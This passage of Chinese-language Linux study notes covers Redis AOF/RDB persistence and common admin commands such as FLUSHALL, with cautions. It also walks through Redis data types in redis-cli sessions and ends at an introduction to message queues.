由于该机制对日志文件的写入操作采用的是append模式，因此在写入过程中不需要seek, 即使出现宕机现象，也不会破坏日志文件中已经存在的内容。然而如果本次操作只是写入了一半数据就出现了系统崩溃问题，不用担心，在Redis下一次启动之前，可以通过 redis-check-aof 工具来解决数据一致性的问题。

Redis可以在 AOF文件体积变得过大时，自动地在后台对AOF进行重写,重写后的新AOF文件包含了恢复当前数据集所需的最小命令集合。整个重写操作是绝对安全的，因为Redis在创建新 AOF文件的过程中，append模式不断的将修改数据追加到现有的 AOF文件里面，即使重写过程中发生停机，现有的 AOF文件也不会丢失。而一旦新AOF文件创建完毕，Redis就会从旧AOF文件切换到新AOF文件，并开始对新AOF文件进行追加操作。

AOF包含一个格式清晰、易于理解的日志文件用于记录所有的修改操作。事实上，也可以通过该文件完成数据的重建。

AOF文件有序地保存了对数据库执行的所有写入操作，这些写入操作以Redis协议的格式保存，因此 AOF文件的内容非常容易被人读懂，对文件进行分析(parse)也很轻松。导出（export)AOF文件也非常简单:举个例子，如果你不小心执行了FLUSHALL.命令，但只要AOF文件未被重写，那么只要停止服务器，移除 AOF文件末尾的FLUSHAL命令，并重启Redis ,就可以将数据集恢复到FLUSHALL执行之前的状态。




#2.AOF 模式缺点
即使有些操作是重复的也会全部记录，AOF 的文件大小要大于 RDB 格式的文件。
AOF 在恢复大数据集时的速度比 RDB 的恢复速度要慢。
根据fsync策略不同,AOF速度可能会慢于RDB。
bug 出现的可能性更多。
```

##### 45.3.7.5 RDB和AOF的选择

```
如果主要充当缓存功能,或者可以承受数分钟数据的丢失, 通常生产环境一般只需启用RDB即可,此也是默认值。
如果数据需要持久保存,一点不能丢失,可以选择同时开启RDB和AOF,一般不建议只开启AOF。
```

#### 45.3.8 Redis常用命令

官方文档：https://redis.io/commands

参考链接: http://redisdoc.com/

##### 45.3.8.1 INFO

```
#显示当前节点redis运行状态信息
[root@centos8 ~]# redis-cli -h 10.0.0.17 -a 123456
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
10.0.0.17:6379> info
# Server
redis_version:6.2.2
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:5cd03fc5be709dea
redis_mode:standalone
os:Linux 3.10.0-1160.el7.x86_64 x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:4.8.5
process_id:1918
process_supervised:systemd
run_id:787dcef0638e78866615fa5a528a5d5056a97702
tcp_port:6379
server_time_usec:1657847734973101
uptime_in_seconds:29420
uptime_in_days:0
hz:10
configured_hz:10
lru_clock:13680566
executable:/apps/redis/bin/redis-server
config_file:/apps/redis/etc/redis.conf
io_threads_active:0

# Clients
connected_clients:2
cluster_connections:0
maxclients:4064
client_recent_max_input_buffer:24
client_recent_max_output_buffer:0
blocked_clients:0
tracking_clients:0
clients_in_timeout_table:0

# Memory
used_memory:616376
used_memory_human:601.93K
used_memory_rss:3571712
used_memory_rss_human:3.41M
used_memory_peak:674504
used_memory_peak_human:658.70K
used_memory_peak_perc:91.38%
used_memory_overhead:572664
used_memory_startup:531544
used_memory_dataset:43712
used_memory_dataset_perc:51.53%
allocator_allocated:660520
allocator_active:921600
allocator_resident:3289088
total_system_memory:1907744768
total_system_memory_human:1.78G
used_memory_lua:37888
used_memory_lua_human:37.00K
used_memory_scripts:0
used_memory_scripts_human:0B
number_of_cached_scripts:0
maxmemory:0
maxmemory_human:0B
maxmemory_policy:noeviction
allocator_frag_ratio:1.40
allocator_frag_bytes:261080
allocator_rss_ratio:3.57
allocator_rss_bytes:2367488
rss_overhead_ratio:1.09
rss_overhead_bytes:282624
mem_fragmentation_ratio:6.23
mem_fragmentation_bytes:2998104
mem_not_counted_for_evict:4
mem_replication_backlog:0
mem_clients_slaves:0
mem_clients_normal:41000
mem_aof_buffer:8
mem_allocator:jemalloc-5.1.0
active_defrag_running:0
lazyfree_pending_objects:0
lazyfreed_objects:0

# Persistence
loading:0
current_cow_size:0
current_cow_size_age:0
current_fork_perc:0.00
current_save_keys_processed:0
current_save_keys_total:0
rdb_changes_since_last_save:0
rdb_bgsave_in_progress:0
rdb_last_save_time:1657821915
rdb_last_bgsave_status:ok
rdb_last_bgsave_time_sec:0
rdb_current_bgsave_time_sec:-1
rdb_last_cow_size:204800
aof_enabled:1
aof_rewrite_in_progress:0
aof_rewrite_scheduled:0
aof_last_rewrite_time_sec:-1
aof_current_rewrite_time_sec:-1
aof_last_bgrewrite_status:ok
aof_last_write_status:ok
aof_last_cow_size:0
module_fork_in_progress:0
module_fork_last_cow_size:0
aof_current_size:111
aof_base_size:111
aof_pending_rewrite:0
aof_buffer_length:0
aof_rewrite_buffer_length:0
aof_pending_bio_fsync:0
aof_delayed_fsync:0

# Stats
total_connections_received:2
total_commands_processed:4
instantaneous_ops_per_sec:0
total_net_input_bytes:105
total_net_output_bytes:20372
instantaneous_input_kbps:0.00
instantaneous_output_kbps:0.00
rejected_connections:0
sync_full:0
sync_partial_ok:0
sync_partial_err:0
expired_keys:0
expired_stale_perc:0.00
expired_time_cap_reached_count:0
expire_cycle_cpu_milliseconds:406
evicted_keys:0
keyspace_hits:1
keyspace_misses:0
pubsub_channels:0
pubsub_patterns:0
latest_fork_usec:229
total_forks:1
migrate_cached_sockets:0
slave_expires_tracked_keys:0
active_defrag_hits:0
active_defrag_misses:0
active_defrag_key_hits:0
active_defrag_key_misses:0
tracking_total_keys:0
tracking_total_items:0
tracking_total_prefixes:0
unexpected_error_replies:0
total_error_replies:0
dump_payload_sanitizations:0
total_reads_processed:5
total_writes_processed:4
io_threaded_reads_processed:0
io_threaded_writes_processed:0

# Replication
role:master
connected_slaves:0
master_failover_state:no-failover
master_replid:483d2ebaed8d3a26d6284d9af2bd0ac92ad95617
master_replid2:0000000000000000000000000000000000000000
master_repl_offset:0
second_repl_offset:-1
repl_backlog_active:0
repl_backlog_size:1048576
repl_backlog_first_byte_offset:0
repl_backlog_histlen:0

# CPU
used_cpu_sys:15.044901
used_cpu_user:18.498277
used_cpu_sys_children:0.002167
used_cpu_user_children:0.000000
used_cpu_sys_main_thread:15.120514
used_cpu_user_main_thread:18.418403

# Modules

# Errorstats

# Cluster
cluster_enabled:0

# Keyspace
db0:keys=2,expires=0,avg_ttl=0
```

##### 45.3.8.2 SELECT

```
#切换数据库，相当于在MySQL的USE DBNAME指令
#默认数据库的数量只有0~15个
10.0.0.17:6379> select 1
OK
10.0.0.17:6379[1]> set class liu6666
OK
10.0.0.17:6379[1]> get class
"liu6666"
10.0.0.17:6379[1]> select 0
OK
10.0.0.17:6379> get class
"m6666"
10.0.0.17:6379> select 16
(error) ERR DB index is out of range
10.0.0.17:6379> 
```

**注意: 在 redis cluster模式下不支持多个数据库,会出现下面错误**

```
[root@centos8 ~]#redis-cli 
127.0.0.1:6379> info cluster
# Cluster
cluster_enabled:1
127.0.0.1:6379> select 0
OK
127.0.0.1:6379> select 1
(error) ERR SELECT is not allowed in cluster mode
```

##### 45.3.8.3 KEYS

**查看当前库下的所有key，此命令慎用！**

![1657848435174](linux体系.assets/1657848435174.png)

```
127.0.0.1:6379[15]> SELECT 0
OK
127.0.0.1:6379> KEYS *
1) "9527"
2) "9526"
3) "paihangbang"
4) "list1"
127.0.0.1:6379> SELECT 1
OK
127.0.0.1:6379[1]> KEYS *
(empty list or set)
127.0.0.1:6379[1]> 

redis>MSET one 1 two 2 three 3 four 4  # 一次设置 4 个 key
OK

redis> KEYS *o*  #模糊搜索
1) "four"
2) "two"
3) "one"

redis> KEYS t??
1) "two"

redis> KEYS t[w]*
1) "two"

redis> KEYS *  # 匹配数据库内所有 key
1) "four"
2) "three"
3) "two"
4) "one"
```

##### 45.3.8.4 BGSAVE

**手动在后台执行RDB持久化操作**

```
#交互式执行
127.0.0.1:6379[1]> BGSAVE
Background saving started

#非交互式执行
[root@centos8 ~]#ll /var/lib/redis/
total 4
-rw-r--r-- 1 redis redis 326 Feb 18 22:45 dump.rdb

[root@centos8 ~]#redis-cli -h 127.0.0.1 -a '123456' BGSAVE
Warning: Using a password with '-a' or '-u' option on the command line interface 
may not be safe.
Background saving started
[root@centos8 ~]#ll /var/lib/redis/
total 4
-rw-r--r-- 1 redis redis 92 Feb 18 22:54 dump.rdb
```

##### 45.3.8.5 DBSIZE

**返回当前库下的所有key数量**

```
127.0.0.1:6379> DBSIZE
(integer) 4
127.0.0.1:6379> SELECT 1
OK
127.0.0.1:6379[1]> DBSIZE
(integer) 0
```

##### 45.3.8.6 FLUSHDB

**强制清空当前库中的所有key，此命令慎用！**

```
127.0.0.1:6379[1]> SELECT 0
OK
127.0.0.1:6379> DBSIZE
(integer) 4
127.0.0.1:6379> FLUSHDB
OK
127.0.0.1:6379> DBSIZE
(integer) 0
127.0.0.1:6379>
```

##### 45.3.8.7 FLUSHALL

**强制清空当前redis服务器所有数据库中的所有key，即删除所有数据，此命令慎用！**

```
#强制清除默认16个数据库里面的所有数据
127.0.0.1:6379> FLUSHALL
OK
#生产建议修改配置 /etc/redis.conf
#rename-command 在6.2.4向上的版本已经淘汰了
rename-command FLUSHALL ""  #设置空就是禁用的意思，注意大小写
rename-command FLUSHALL "abc" #输入abc就等于执行FLUSHALL
```

##### 45.3.8.8 SHUTDOWN

```
可用版本： >= 1.0.0
时间复杂度： O(N)，其中 N 为关机时需要保存的数据库键数量。
SHUTDOWN 命令执行以下操作：

停止所有客户端
如果有至少一个保存点在等待，执行 SAVE 命令

如果AOF选项被打开，更新AOF文件

关闭redis服务器(server)

如果持久化被打开的话，SHUTDOWN 命令会保证服务器正常关闭而不丢失任何数据。

另一方面，假如只是单纯地执行SAVE命令，然后再执行QUIT命令，则没有这一保证 —— 因为在执行SAVE 之后、执行QUIT之前的这段时间中间，其他客户端可能正在和服务器进行通讯，这时如果执行QUIT就会造成数据丢失。
```

#### 45.3.9 redis数据类型

参考资料：http://www.redis.cn/topics/data-types.html

相关命令参考: http://redisdoc.com/

![1657853554667](linux体系.assets/1657853554667.png)

![1657853630832](linux体系.assets/1657853630832.png)

##### 45.3.9.1 字符串string

```
字符串是所有编程语言中最常见的和最常用的数据类型，而且也是redis最基本的数据类型之一，而且redis中所有的key的类型都是字符串。常用于保存Session信息场景，此数据类型比较常用。
```

![1657853881155](linux体系.assets/1657853881155.png)

**添加一个key**

```
#1.概述
#set指令可以创建一个key并赋值, 使用格式。

SET key value [EX seconds] [PX milliseconds] [NX|XX]
时间复杂度： O(1)
将字符串值 value 关联到 key。

如果key已经持有其他值，SET就覆写旧值，无视类型。
当 SET 命令对一个带有生存时间（TTL）的键进行设置之后，该键原有的 TTL 将被清除。

从 Redis 2.6.12 版本开始， SET 命令的行为可以通过一系列参数来修改：
EX seconds ： 将键的过期时间设置为seconds秒。执行 SET key value EX seconds 的效果等同于执行 SETEX key seconds value。(用来设置发红包的有效期)
PX milliseconds ： 将键的过期时间设置为milliseconds毫秒。 执行 SET key value PX milliseconds 的效果等同于执行 PSETEX key milliseconds value 。
NX ： 只在键不存在时，才对键进行设置操作。执行 SET key value NX 的效果等同于执行 SETNX key value 。
XX ： 只在键已经存在时， 才对键进行设置操作。






#2.范例
#不论key是否存在.都设置
127.0.0.1:6379> set key1 value1 OK
127.0.0.1:6379> get key1
"value1"
127.0.0.1:6379> TYPE key1	#判断类型
string
127.0.0.1:6379> SET title ceo ex 3 #设置自动过期时间3s OK
127.0.0.1:6379> set NAME wang OK
127.0.0.1:6379> get NAME
"wang"

#大小写敏感
127.0.0.1:6379> get name (nil)
127.0.0.1:6379> set name mage OK
127.0.0.1:6379> get name "mage"
127.0.0.1:6379> get NAME
"wang"

#key不存在,才设置,相当于add
127.0.0.1:6379> get title "ceo"
127.0.0.1:6379> setnx title coo	#set key value nx (integer) 0
127.0.0.1:6379> get title "ceo"

#key存在,才设置,相当于
update 127.0.0.1:6379> get title "ceo"
127.0.0.1:6379> set title coo xx OK
127.0.0.1:6379> get title
"coo"
127.0.0.1:6379> get age
(nil)
127.0.0.1:6379> set age 20 xx (nil)
127.0.0.1:6379> get age
(nil)


#获取一个key的内容
127.0.0.1:6379> get key1
"value1"

127.0.0.1:6379> get name age
(error) ERR wrong number of arguments for 'get' command


#删除一个和多个key
127.0.0.1:6379> DEL key1
(integer) 1

127.0.0.1:6379> DEL key1 key2
(integer) 2



#批量设置多个key
127.0.0.1:6379> MSET key1 value1 key2 value2 
OK


#批量获取多个key
127.0.0.1:6379> MGET key1 key2
1) "value1"
2) "value2"

127.0.0.1:6379> KEYS n*
1) "n1"
2) "name"

127.0.0.1:6379> KEYS *
1) "k2"
2) "k1"
3) "key1"
4) "key2"
5) "n1"
6) "name"
7) "k3"
8) "title"


#追加数据
127.0.0.1:6379> APPEND key1 "append new value"
(integer) 12              #添加数据后,key1总共9个字节
127.0.0.1:6379> get key1
"value1 append new value"

#设置新值并返回旧值
#set key newvalue并返回旧的value
127.0.0.1:6379> set name liu
OK
127.0.0.1:6379> getset name liu666
"liu"
127.0.0.1:6379> get name
"liu666"


#返回字符串 key对应值的字节数
127.0.0.1:6379> SET name liu
OK
127.0.0.1:6379> STRLEN name
(integer) 4
127.0.0.1:6379> APPEND name " senbiao"
(integer) 13
127.0.0.1:6379> GET name
"liu senbiao"
127.0.0.1:6379> STRLEN name  #返回字节数
(integer) 13
127.0.0.1:6379> set name 刘哥教育
OK
127.0.0.1:6379> get name
"\xe9\xa9\xac\xe5\x93\xa5\xe6\x95\x99\xe8\x82\xb2"
127.0.0.1:6379> strlen name
(integer) 12


#判断key是否存在
127.0.0.1:6379> SET name wang ex 10
OK
127.0.0.1:6379> set age 20
OK
127.0.0.1:6379> EXISTS NAME #key的大小写敏感
(integer) 0
127.0.0.1:6379> EXISTS name age #返回值为1,表示存在2个key,0表示不存在
(integer) 2
127.0.0.1:6379> EXISTS name  #过几秒再看
(integer) 0


#查看key的过期时间
ttl key #查看key的剩余生存时间,如果key过期后,会自动删除
-1 #返回值表示永不过期，默认创建的key是永不过期，重新对key赋值，也会从有剩余生命周期变成永不过期
-2 #返回值表示没有此key
num #key的剩余有效期

127.0.0.1:6379> TTL key1
(integer) -1
127.0.0.1:6379> SET name liu EX 100
OK
127.0.0.1:6379> TTL name
(integer) 96
127.0.0.1:6379> TTL name
(integer) 93
127.0.0.1:6379> SET name mage #重新设置，默认永不过期
OK
127.0.0.1:6379> TTL name
(integer) -1
127.0.0.1:6379> SET name liu EX 200
OK
127.0.0.1:6379> TTL name
(integer) 198
127.0.0.1:6379> GET name
"liu"


#重新设置key的过期时间
127.0.0.1:6379> TTL name
(integer) 148
127.0.0.1:6379> EXPIRE name 1000
(integer) 1
127.0.0.1:6379> TTL name
(integer) 999


#取消key的过期时间
即永不过期
127.0.0.1:6379> TTL name
(integer) 999
127.0.0.1:6379> PERSIST name
(integer) 1
127.0.0.1:6379> TTL name
(integer) -1


#数值递增
127.0.0.1:6379> set num 10 #设置初始值
OK
127.0.0.1:6379> INCR num
(integer) 11
127.0.0.1:6379> get num
"11"



#数值递减
127.0.0.1:6379> set num 10
OK
127.0.0.1:6379> DECR num
(integer) 9
127.0.0.1:6379> get num
"9"

#数值增加
将key对应的数字加decrement(可以是负数)。如果key不存在，操作之前，key就会被置为0。如果key的value类型错误或者是个不能表示成数字的字符串，就返回错误。这个操作最多支持64位有符号的正型数字。
redis> SET mykey 10
OK
redis> INCRBY mykey 5
(integer) 15
127.0.0.1:6379> get mykey
"15"
127.0.0.1:6379> INCRBY mykey -10
(integer) 5
127.0.0.1:6379> get mykey
"5"

127.0.0.1:6379> INCRBY nokey  5
(integer) 5
127.0.0.1:6379> get nokey
"5"



# 数据减少
decrby 可以减小数值(也可以增加)
127.0.0.1:6379> SET mykey 10
OK
127.0.0.1:6379> DECRBY mykey 8
(integer) 2
127.0.0.1:6379> get mykey
"2"
127.0.0.1:6379> DECRBY mykey -20
(integer) 22
127.0.0.1:6379> get mykey
"22"

127.0.0.1:6379> DECRBY nokey 3
(integer) -3
127.0.0.1:6379> get nokey
"-3"
```

##### 45.3.9.2 列表list

![1657857860276](linux体系.assets/1657857860276.png)

**生成列表并插入数据**

![1657858005666](linux体系.assets/1657858005666.png)

```
#1.概述
#LPUSH和RPUSH都可以插入列表
LPUSH key value [value …]
时间复杂度： O(1)
将一个或多个值 value 插入到列表 key的表头

如果有多个value值，那么各个value值按从左到右的顺序依次插入到表头： 比如说，对空列表
mylist 执行命令 LPUSH mylist a b c，列表的值将是 c b a 这等同于原子性地执行 LPUSH mylist a 、LPUSH mylist b 和 LPUSH mylist c三个命令。

如果 key 不存在，一个空列表会被创建并执行LPUSH操作。当key存在但不是列表类型时，返回一个错误。

RPUSH key value [value …]
时间复杂度： O(1)
将一个或多个值value插入到列表key的表尾(最右边)。

如果有多个 value 值，那么各个 value 值按从左到右的顺序依次插入到表尾：比如对一个空列表
mylist 执行 RPUSH mylist a b c ，得出的结果列表为 a b c ，等同于执行命令 RPUSH mylist a 、RPUSH mylist b 、 RPUSH mylist c。

如果key不存在，一个空列表会被创建并执行RPUSH操作。当key存在但不是列表类型时，返回一个错误。





#2.案例
#从左边添加数据，已添加的需向右移
127.0.0.1:6379> LPUSH name mage wang zhang	#根据顺序逐个写入name，最后的zhang会在列表的最左侧。
(integer) 3
127.0.0.1:6379> TYPE name
list

#从右边添加数据
127.0.0.1:6379> RPUSH course linux python go (integer) 3
127.0.0.1:6379> type course list



#向列表追加数据
127.0.0.1:6379> LPUSH list1 tom
(integer) 2 #从右边添加数据，已添加的向左移
127.0.0.1:6379> RPUSH list1 jack
(integer) 3


#获取列表长度(元素个数)
127.0.0.1:6379> LLEN list1
(integer) 3 
```

**获取列表指定位置数据**

![1657858570919](linux体系.assets/1657858570919.png)

```
127.0.0.1:6379> LPUSH list1 a b c d
(integer) 4
127.0.0.1:6379> LINDEX list1 0 #获取0编号的元素"d"
127.0.0.1:6379> LINDEX list1 3 #获取3编号的元素"a"
127.0.0.1:6379> LINDEX list1 -1 #获取最后一个的元素"a"

#元素从0开始编号
127.0.0.1:6379> LPUSH list1 a b c d
(integer) 4
127.0.0.1:6379> LRANGE list1 1 2
1) "c"
2) "b"
127.0.0.1:6379> LRANGE list1 0 3	#所有元素
1) "d"
2) "c"
3) "b"
4) "a"
127.0.0.1:6379> LRANGE list1 0 -1	#所有元素
1) "d"
2) "c"
3) "b"
4) "a"



127.0.0.1:6379> RPUSH list2 zhang wang li zhao (integer) 4
127.0.0.1:6379> LRANGE list2 1 2 #指定范围
1)"wang"
2)"li"
127.0.0.1:6379> LRANGE list2 2 2 #指定位置
1) "li"
127.0.0.1:6379> LRANGE list2 0 -1	#所有元素
1)"zhang"
2)"wang"
3)"li"
4)"zhao"
```

**修改列表指定索引值**

![1657858685419](linux体系.assets/1657858685419.png)

```
127.0.0.1:6379> RPUSH listkey a b c d e f
(integer) 6
127.0.0.1:6379> lrange listkey 0 -1
1) "a"
2) "b"
3) "c"
4) "d"
5) "e"
6) "f"
127.0.0.1:6379> lset listkey 2 java
OK
127.0.0.1:6379> lrange listkey 0 -1
1) "a"
2) "b"
3) "java"
4) "d"
5) "e"
6) "f"
127.0.0.1:6379>
```

**移除列表数据**

![1657858838112](linux体系.assets/1657858838112.png)

```
127.0.0.1:6379> LPUSH list1 a b c d
(integer) 4
127.0.0.1:6379> LRANGE list1 0 3
1) "d"
2) "c"
3) "b"
4) "a"
127.0.0.1:6379> LPOP list1 #弹出左边第一个元素，即删除第一个
"d"
127.0.0.1:6379> LLEN list1
(integer) 3
127.0.0.1:6379> LRANGE list1 0 2 1) "c"
2) "b"
3) "a"
127.0.0.1:6379> RPOP list1  #弹出右边第一个元素，即删除最后一个
"a"
127.0.0.1:6379> LLEN list1
(integer) 2
127.0.0.1:6379> LRANGE list1 0 1 1) "c"
2) "b"



#LTRIM 对一个列表进行修剪(trim)，让列表只保留指定区间内的元素，不在指定区间之内的元素都将被删除
127.0.0.1:6379> LLEN list1
(integer) 4
127.0.0.1:6379> LRANGE list1 0 3
1) "d"
2) "c"
3) "b"
4) "a"
127.0.0.1:6379> LTRIM list1 1 2 #只保留1，2号元素
OK
127.0.0.1:6379> LLEN list1
(integer) 2
127.0.0.1:6379> LRANGE list1 0 1 
1) "c"
2) "b"



#删除list
127.0.0.1:6379> DEL list1
(integer) 1
127.0.0.1:6379> EXISTS list1
(integer) 0
```

##### 45.3.9.3 集合set

```
Set 是 String 类型的无序集合，集合中的成员是唯一的，这就意味着集合中不能出现重复的数据，可以在两个不同的集合中对数据进行对比并取值，常用于取值判断，统计，交集等场景。

集合特点
无序
无重复
集合间操作
```

![1657874645898](linux体系.assets/1657874645898.png)

```
#生成集合key
127.0.0.1:6379> SADD set1 v1
(integer) 1
127.0.0.1:6379> SADD set2 v2 v4
(integer) 2
127.0.0.1:6379> TYPE set1
set
127.0.0.1:6379> TYPE set2
set


#追加数值
#追加时，只能追加不存在的数据，不能追加已经存在的数值
127.0.0.1:6379> SADD set1 v2 v3 v4
(integer) 3
127.0.0.1:6379> SADD set1 v2 #已存在的value,无法再次添加
(integer) 0
127.0.0.1:6379> TYPE set1
set
127.0.0.1:6379> TYPE set2
set


#查看集合的所有数据
127.0.0.1:6379> SMEMBERS set1
1) "v4"
2) "v1"
3) "v3"
4) "v2"
127.0.0.1:6379> SMEMBERS set2
1) "v4"
2) "v2"



#删除集合中的元素
127.0.0.1:6379> sadd goods mobile laptop car 
(integer) 3
127.0.0.1:6379> srem goods car
(integer) 1
127.0.0.1:6379> SMEMBERS goods
1) "mobile"
2) "laptop"
```

**集合间操作**

![1657875069816](linux体系.assets/1657875522292.png)

```
#获取集合的交集
交集：已属于A且属于B的元素称为A与B的交（集）
127.0.0.1:6379> SINTER set1 set2
1) "v4"
2) "v2"



#获取集合的并集
并集：已属于A或属于B的元素为称为A与B的并（集）
127.0.0.1:6379> SUNION set1 set2
1) "v2"
2) "v4"
3) "v1"
4) "v3"



#获取集合的差集
差集：已属于A而不属于B的元素称为A与B的差（集）
简而言之就是从set1中剔除属于set2的东西
127.0.0.1:6379> SDIFF set1 set2
1) "v1"
2) "v3"
```

##### 45.3.9.4 有序集合 sorted set

```
Redis 有序集合和集合一样也是string类型元素的集合,且不允许重复的成员，不同的是每个元素都会关联一个double(双精度浮点型)类型的分数，redis正是通过该分数来为集合中的成员进行从小到大的排序，有序集合的成员是唯一的,但分数(score)却可以重复，集合是通过哈希表实现的，所以添加，删除，查找的复杂度都是O(1)， 集合中最大的成员数为 2^32 - 1 (4294967295, 每个集合可存储40多亿个成员)，经常用于排行榜的场景。


有序集合特点
有序
无重复元素
每个元素是由score和value组成
score 可以重复
value 不可以重复
```

![1657876186446](linux体系.assets/1657876186446.png)

**生成有序集合**

```
127.0.0.1:6379> ZADD zset1 1 v1  #分数为1
(integer) 1
127.0.0.1:6379> ZADD zset1 2 v2
(integer) 1
127.0.0.1:6379> ZADD zset1 2 v3  #分数可重复，元素值不可以重复
(integer) 1
127.0.0.1:6379> ZADD zset1 3 v4
(integer) 1
127.0.0.1:6379> TYPE zset1
zset
127.0.0.1:6379> TYPE zset2
zset


#一次生成多个数据：
127.0.0.1:6379> ZADD zset2 1 v1 2 v2 3 v3 4 v4 5 v5
(integer) 5
```

**有序集合实现排行榜**

```
127.0.0.1:6379> ZADD paihangbang 90 nezha 199 zhanlang 60 zhuluoji 30 gangtiexia
(integer) 4
127.0.0.1:6379> ZRANGE paihangbang 0 -1  #正序排序后显示集合内所有的key,score从小到大
显示
1) "gangtiexia"
2) "zhuluoji"
3) "nezha"
4) "zhanlang"
127.0.0.1:6379> ZREVRANGE paihangbang 0 -1 #倒序排序后显示集合内所有的key,score从大到小显示
1) "zhanlang"
2) "nezha"
3) "zhuluoji"
4) "gangtiexia"
127.0.0.1:6379> ZRANGE paihangbang 0 -1 WITHSCORES  #正序显示指定集合内所有key和得分情况
1) "gangtiexia"
2) "30"
3) "zhuluoji"
4) "60"
5) "nezha"
6) "90"
7) "zhanlang"
8) "199"
127.0.0.1:6379> ZREVRANGE paihangbang 0 -1 WITHSCORES  #倒序显示指定集合内所有key和
得分情况
1) "zhanlang"
2) "199"
3) "nezha"
4) "90"
5) "zhuluoji"
6) "60"
7) "gangtiexia"
8) "30"
127.0.0.1:6379>
```

**获取集合的个数**

```
127.0.0.1:6379> ZCARD paihangbang
(integer) 4
127.0.0.1:6379> ZCARD zset1
(integer) 4
127.0.0.1:6379> ZCARD zset2
(integer) 4
```

 **基于索引返回数值**

```
127.0.0.1:6379> ZRANGE paihangbang 0 2 1) "gangtiexia"
2) "zhuluoji"
3) "nezha"
127.0.0.1:6379> ZRANGE paihangbang 0 10  #超出范围不报错
1) "gangtiexia"
2) "zhuluoji"
3) "nezha"
4) "zhanlang

127.0.0.1:6379> ZRANGE zset1 1 3 1) "v2"
2) "v3"
3) "v4"
127.0.0.1:6379> ZRANGE zset1 0 2 1) "v1"
2) "v2"
3) "v3"
127.0.0.1:6379> ZRANGE zset1 2 2 1) "v3"
```

**返回某个数值的索引(排名)**

```
127.0.0.1:6379> ZADD paihangbang 90 nezha 199 zhanlang 60 zhuluoji 30 gangtiexia
(integer) 4
127.0.0.1:6379> ZRANK paihangbang zhanlang
(integer) 3   #第4个
127.0.0.1:6379> ZRANK paihangbang zhuluoji
(integer) 1   #第2个
```

**获取分数**

```
127.0.0.1:6379> zscore paihangbang gangtiexia
"30"
```

 **删除元素**

```
127.0.0.1:6379> ZADD paihangbang 90 nezha 199 zhanlang 60 zhuluoji 30 gangtiexia
(integer) 4
127.0.0.1:6379> ZRANGE paihangbang 0 -1
1) "gangtiexia"
2) "zhuluoji"
3) "nezha"
4) "zhanlang"
127.0.0.1:6379> ZREM paihangbang zhuluoji zhanlang  #删除元素
(integer) 2
127.0.0.1:6379> ZRANGE paihangbang 0 -1
1) "gangtiexia"
2) "nezha"
```

##### 45.3.9.5  哈希hash

```
#1.概述
hash 是一个string类型的字段(field)和值(value)的映射表，Redis 中每个 hash 可以存储 2^32 -1 键值对，类似于字典，存放了多个k/v对，hash特别适合用于存储对象场景。


格式:
HSET hash field value
时间复杂度： O(1)
将哈希表 hash 中域 field 的值设置为value 。
如果给定的哈希表并不存在， 那么一个新的哈希表将被创建并执行HSET操作。
如果域 field 已经存在于哈希表中， 那么它的旧值将被新值value覆盖。




#2.范例
127.0.0.1:6379> HSET 9527 name zhouxingxing age 20
(integer) 2
127.0.0.1:6379> TYPE 9527
hash

#查看所有字段的值
127.0.0.1:6379> hgetall 9527
1) "name"
2) "zhouxingxing"
3) "age"
4) "20"

#增加字段
127.0.0.1:6379> HSET 9527 gender male
(integer) 1
127.0.0.1:6379> hgetall 9527
1) "name"
2) "zhouxingxing"
3) "age"
4) "20"
5) "gender"
6) "male"
```

![1657876939688](linux体系.assets/1657876939688.png)

![1657876951500](linux体系.assets/1657876951500.png)

![1657876963290](linux体系.assets/1657876963290.png)

**获取hash key的对应字段的值**

```
127.0.0.1:6379> HGET 9527 name
"zhouxingxing"
127.0.0.1:6379> HGET 9527 age
"20"

127.0.0.1:6379> HMGET 9527 name age  #获取多个值
1) "zhouxingxing"
2) "20"
```

**删除一个hash key 的对应字段**

```
127.0.0.1:6379> HDEL 9527 age
(integer) 1
127.0.0.1:6379> HGET 9527 age
(nil)

127.0.0.1:6379> hgetall 9527
1) "name"
2) "zhouxingxing"

127.0.0.1:6379> HGET 9527 name
"zhouxingxing"
```

**批量设置hash key的多个field和value**

```
127.0.0.1:6379> HMSET 9527 name zhouxingxing age 50 city hongkong
OK
127.0.0.1:6379> HGETALL 9527
1) "name"
2) "zhouxingxing"
3) "age"
4) "50"
5) "city"
6) "hongkong"
```

**获取hash中指定字段的值**

```
127.0.0.1:6379> HMSET 9527 name zhouxingxing age 50 city hongkong
OK
127.0.0.1:6379> HMGET 9527 name age 
1) "zhouxingxing"
2) "50"
```

**获取hash中的所有字段名field**

```
127.0.0.1:6379> HMSET 9527 name zhouxingxing age 50 city hongkong #重新设置
OK
127.0.0.1:6379> HKEYS 9527
1) "name"
2) "age"
3) "city"
```

**获取hash key对应所有field的value**

```
127.0.0.1:6379> HMSET 9527 name zhouxingxing age 50 city hongkong
OK
127.0.0.1:6379> HVALS 9527
1) "zhouxingxing"
2) "50"
3) "hongkong"
```

**获取指定hash key 的所有field及value**

```
127.0.0.1:6379> HGETALL 9527
1) "name"
2) "zhouxingxing"
3) "age"
4) "50"
5) "city"
6) "hongkong"
```

**删除 hash**

```
127.0.0.1:6379> DEL 9527
(integer) 1
127.0.0.1:6379> HMGET 9527 name city
1) (nil)
2) (nil)
127.0.0.1:6379> EXISTS 9527
(integer) 0
```

#### 45.3.10 消息队列

```
消息队列: 把要传输的数据放在队列中
功能: 可以实现多个系统之间的解耦,异步,削峰/限流等
常用的消息队列应用: kafka,rabbitMQ,redis


消息队列主要分为两种,这两种模式Redis都支持
生产者/消费者模式
发布者/订阅者模式
```

![1657878253582](linux体系.assets/1657878253582.png)

##### 45.3.10.1 生产者消费者模式

```
在生产者/消费者(Producer/Consumer)模式下，上层应用接收到的外部请求后开始处理其当前步骤的操作，在执行完成后将已经完成的操作发送至指定的频道(channel,逻辑队列)当中，并由其下层的应用监听该频道并继续下一步的操作，如果其处理完成后没有下一步的操作就直接返回数据给外部请求，如果还有下一步的操作就再将任务发布到另外一个频道，由另外一个消费者继续监听和处理。此模式应用广泛。
```

**模式介绍**

```
生产者消费者模式下，多个消费者同时监听一个队列，但是一个消息只能被最先抢到消息的消费者消费，即消息任务是一次性读取和处理，此模式在分布式业务架构中很常用，比较常用的消息队列软件还有RabbitMQ、Kafka、RocketMQ、ActiveMQ等。
```

![1657884600243](linux体系.assets/1657884600243.png)



 **队列介绍**

```
队列当中的消息由不同的生产者写入，也会有不同的消费者取出进行消费处理，但是一个消息一定是只能被取出一次也就是被消费一次。。。。
```
